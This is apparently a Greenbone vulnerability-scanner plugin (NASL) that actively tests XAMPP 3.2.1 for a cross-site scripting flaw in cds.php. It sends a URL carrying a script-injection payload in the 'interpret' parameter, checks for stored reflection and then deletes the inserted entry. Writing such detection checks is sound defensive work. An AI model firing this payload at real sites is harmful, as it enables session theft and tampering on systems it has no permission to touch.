# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:apachefriends:xampp";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804078");
  script_version("2024-06-18T05:05:55+0000");
  script_tag(name:"last_modification", value:"2024-06-18 05:05:55 +0000 (Tue, 18 Jun 2024)");
  script_tag(name:"creation_date", value:"2014-01-22 17:43:28 +0530 (Wed, 22 Jan 2014)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("XAMPP Control Panel XSS Vulnerability (Jan 2014) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_xampp_http_detect.nasl");
  script_mandatory_keys("xampp/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"XAMPP is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The cds.php script does not validate input to the 'interpret'
  parameter before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"XAMPP Control Panel version 3.2.1. Other versions may also be
  affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://1337day.com/exploit/21761");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64974");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/90520");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124788");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/cds.php?interpret=%22><script>alert(document.cookie)</script>&titel=title&jahr=1";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: FALSE);

if (res && res =~ "^HTTP/1\.[01] 200" && ">CD Collection" >< res) {
  if (http_vuln_check(port: port, url: dir + "/cds-fpdf.php", check_header: TRUE,
                      pattern: "<script>alert\(document\.cookie\)</script>")) {
    delId = eregmatch(string: res, pattern: 'alert.document.cookie.&lt;/script&gt;</b>' +
                                            '</td><td class=tabval>title&nbsp;</td><td class=tabval>1&nbsp;<' +
                                            '/td><td class=tabval><a onclick="return confirm..Sure...;" href' +
                                            '=cds.php.action=del&id=([0-9]*)');

    req = http_get(port: port, item: dir + "/cds.php?action=del&id=" + delId[1]);
    res = http_keepalive_send_recv(port: port, data: req, bodyonly: FALSE);

    if (res && res =~ "^HTTP/1.[01] 200" && "alert(document.cookie)" >!< res) {
      report = http_report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    } else {
      report  = http_report_vuln_url(port: port, url: url);
      report += '\n\nSome data was inserted at ' + dir + '/cds.php to check the vulnerability. Please remove it.';
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
